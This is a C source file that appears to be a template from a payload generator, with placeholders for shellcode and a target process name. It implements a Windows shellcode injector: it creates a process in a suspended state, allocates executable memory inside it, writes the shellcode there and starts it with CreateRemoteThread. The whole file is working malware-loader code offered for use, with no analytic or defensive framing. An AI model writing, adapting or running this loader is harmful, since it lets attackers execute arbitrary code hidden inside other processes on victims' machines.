#include <stdio.h>
#include <windows.h>

int main()
{
    {{shell_code}}

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    if (!CreateProcessA(
        NULL,                          
        (LPSTR)"{{process_name}}",          
        NULL,                          
        NULL,                          
        FALSE,                         
        CREATE_SUSPENDED,              
        NULL,                          
        NULL,                          
        &si,                          
        &pi                           
    )) {
        printf("[!] CreateProcess failed. Error: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] Process created with PID: %lu\n", pi.dwProcessId);

    LPVOID VirtAlloc = VirtualAllocEx(pi.hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (VirtAlloc == NULL) {
        printf("[!] VirtualAllocEx failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    if (!WriteProcessMemory(pi.hProcess, VirtAlloc, buf, sizeof(buf), NULL)) {
        printf("[!] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Shellcode written to memory successfully\n");

    HANDLE RemoteThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)VirtAlloc, NULL, 0, NULL);
    if (RemoteThread == NULL) {
        printf("[!] CreateRemoteThread failed. Error: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Remote thread created successfully\n");

    ResumeThread(pi.hThread);

    CloseHandle(RemoteThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}